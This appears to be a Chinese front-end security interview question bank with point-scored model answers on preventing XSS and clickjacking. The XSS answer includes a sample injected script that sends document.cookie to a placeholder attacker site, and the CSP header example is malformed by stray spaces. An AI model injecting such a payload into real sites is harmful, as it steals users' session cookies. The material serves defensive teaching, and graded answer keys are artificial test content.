# 前端安全

## 什么是跨站脚本攻击（XSS）？如何防范？

#### 类型：`基础`

#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`

#### 解答（9 分）

<details>

- **2：** 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注
入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：
一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如
`<script>document.location = 'http://malicious - site.com?cookie=' + document.cookie</script>`。当其他用户访问包含这条评论
的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意
网站`（http://malicious - site.com）`。

- **1：** 输入验证和过滤：<br/>
&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。
&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对<、>、&、"、'等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL
 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。
- **2：** 输出编码：<br/>
&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使
用 HTML 实体编码。例如，`将<转义为&lt;，>转义为&gt;`。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。
- **2：** 内容安全策略（CSP）：<br/>
&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设
置`Content-Security-Policy: default- src'self'; script-src'self' https://trusted-scripts.com`。这意味着默认情况下，只允许来自当前网
站（self）的资源加载，而脚本可以来自当前网站和`https://trusted - scripts.com`。这样可以防止外部恶意脚本的注入。<br/>
&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为'nonce-value'或'hash-value'来限制内联脚本的执行。内联脚本是直接写在
HTML 标签中的脚本，如`<script>alert('XSS');</script>`，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，
攻击者可能会利用它来执行恶意代码。
- **2：** 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式`（{{}}）`时会对内容进行 HTML 转义，防止脚本注入。

</details>

## 前端如何防止点击劫持？

#### 类型：`基础`

#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`

#### 解答（2 分）

- **2：** 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。
